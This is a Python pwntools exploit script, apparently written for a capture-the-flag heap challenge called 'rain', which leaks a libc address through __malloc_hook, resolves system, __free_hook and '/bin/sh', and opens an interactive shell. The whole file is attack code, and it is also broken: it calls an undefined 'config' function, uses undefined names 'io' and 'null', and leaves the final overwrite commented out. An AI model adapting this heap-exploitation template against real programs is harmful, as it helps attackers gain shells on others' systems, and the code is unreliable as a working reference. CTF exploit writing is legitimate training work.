# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './rain'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def set(a,b,c,d,e,f):
    cmd(1)
    pay=p32(a)+p32(b)+p8(c)+p8(d)+p32(e)
    pay+=f
    io.sendafter('FRAME> ',pay)

def show():
    cmd(2)

def rain():
    cmd(3)

# one_gad = one_gadget(libc.path)

def attack():
    
    payload=p32(0)+p32(0)+p8(0)+p8(0)+p8(0)*4+p32(0)

    print(len(payload))

    for i in range(7):
        config(payload + '\xff'*0x80)
        config(payload + '\xff'*0x148)

    config(payload + '\xff'*0x80)
    config(payload )

    show()
    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    lg('__free_hook',__free_hook)

    config(payload + 'a')
    config(payload )

    config(payload + 'a'*0x80)

    # config(payload )
    # config(payload + '\xff'*0x70)
    # config(payload )
    # config(payload + '\xff'*0x148)

    # for i in range(7):
    #     config(payload)

    # # config(payload + '\xff'*0x148)
    # # for i in range(7):
    # #     config(payload)
    # # config(payload)

    # show()
    # __malloc_hook = l64() - 0x70
    # libc.address = __malloc_hook - libc.sym['__malloc_hook']
    # system_addr = libc.sym['system']
    # __free_hook = libc.sym['__free_hook']
    # binsh_addr = libc.search('/bin/sh').next()
    # lg('__free_hook',__free_hook)

    # config(payload + 'a')

    # payload=p32(1)+p32(0x50)+p8(0)+p8(0)+p8(0)*4+p32(0)

    # config(payload )
    # config(payload + 'a' )

    dbg()

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   rain.py
@Time    :   2022/02/27 14:30:15
@Author  :   Niyah 
'''